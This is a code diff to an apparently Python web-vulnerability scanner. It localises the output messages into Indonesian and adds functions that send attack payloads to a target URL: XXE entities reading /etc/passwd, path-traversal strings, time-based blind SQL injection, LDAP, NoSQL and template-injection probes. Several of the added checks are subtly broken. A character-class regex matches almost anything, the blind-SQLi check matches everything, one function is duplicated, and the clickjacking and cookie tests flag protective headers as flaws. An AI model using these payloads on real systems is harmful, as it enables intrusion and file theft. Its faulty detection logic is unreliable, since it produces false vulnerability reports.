@@ -28,12 +28,12 @@ def main_function(url, payloads, check):
                         print ga.red+" [*] Payload: " ,payload +ga.end
                         print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
                         print ga.blue+" [*] POC: "+ga.end + bugs
-                        print ga.green+" [*] Happy Exploitation :D"+ga.end
+                        print ga.green+" [*] Selamat Bersenang-senang:D"+ga.end
                         vuln +=1
         if vuln == 0:                
         	print ga.green+" [!] Target is not vulnerable!"+ga.end
         else:
-        	print ga.blue+" [!] Congratulations you've found %i bugs :-) " % (vuln) +ga.end
+        	print ga.blue+" [!] Selamat kamu menemukan %i bugs :-) " % (vuln) +ga.end
 
 # Here stands the vulnerabilities functions and detection payloads. 
 def rce_func(url):
@@ -123,3 +123,95 @@ def csrf_func(url):
     check = re.compile(r"csrf_token|csrfmiddlewaretoken|CSRFToken", re.I)
     main_function(url, payloads, check)
     
+def xssi_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Cross-Site Script Inclusion (XSSI) Vulnerabilities " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '/api/user?id=1', '/api/user?id=2', '/api/user?id=3',
+        '/api/user?id=4', '/api/user?id=5'
+    ]
+    check = re.compile(r'user_id:\d+', re.I)
+    main_function(url, payloads, check)
+
+def ssti_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Server-Side Template Injection (SSTI) Vulnerabilities " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '{{7*7}}', '{{7*8}}', '{{7*9}}',
+        '{{7*10}}', '{{7*11}}'
+    ]
+    check = re.compile(r'49|56|63|70|77', re.I)
+    main_function(url, payloads, check)
+    
+def ldap_injection_func(url):
+    print(ga.bold + "\n [!] Lagi scan: LDAP Injection " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '*(|(objectclass=*))', '*)(uid=*))(|(uid=*))', '*)(objectclass=*))',
+        '*)(objectclass=*)(|(objectclass=*))'
+    ]
+    check = re.compile(r"uid|objectclass", re.I)
+    main_function(url, payloads, check)
+
+def nosql_injection_func(url):
+    print(ga.bold + "\n [!] Lagi scan: NoSQL Injection " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '{"$ne": null}', '{"$ne": 1}', '{"$eq": ""}', '{"$gt": ""}', '{"$lt": ""}'
+    ]
+    check = re.compile(r"MongoDB|NoSQL", re.I)
+    main_function(url, payloads, check)
+
+def xxe_func(url):
+    print(ga.bold + "\n [!] Lagi scan: XML External Entity (XXE) Vulnerabilities " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>'
+    ]
+    check = re.compile(r"root:|[boot loader]", re.I)
+    main_function(url, payloads, check)
+    
+def path_traversal_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Path Traversal " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '../../../../../etc/passwd', '../../../../../../windows/win.ini',
+        '../../../../../../../../../../etc/passwd', '../../../../../../../../../../windows/win.ini'
+    ]
+    check = re.compile(r"root:|[boot loader]", re.I)
+    main_function(url, payloads, check)
+    
+def clickjacking_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Clickjacking " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = ['dummy_payload']
+    check = re.compile(r"X-Frame-Options", re.I)
+    main_function(url, payloads, check)
+  
+def insecure_cookies_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Insecure Cookies " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = ['dummy_payload']
+    check = re.compile(r"Set-Cookie:.*(httponly|secure)", re.I)
+    main_function(url, payloads, check)
+  
+def sqli_blind_func(url):
+    print(ga.bold + "\n [!] Lagi scan: Blind SQL Injection " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        "' AND SLEEP(5)#", "' AND 1=2 UNION SELECT SLEEP(5)#", 
+        "' OR SLEEP(5)#", "' AND IF(1=1, SLEEP(5), 0)#"
+    ]
+    check = re.compile(r"(.*)", re.I)
+    main_function(url, payloads, check)
+   
+def xxes_func(url):
+    print(ga.bold + "\n [!] Lagi scan: XML External Entity (XXE) Vulnerabilities " + ga.end)
+    print(ga.blue + " [!] Tunggu dek ...." + ga.end)
+    payloads = [
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]><foo>&xxe;</foo>'
+    ]
+    check = re.compile(r"root:|[boot loader]", re.I)
+    main_function(url, payloads, check)
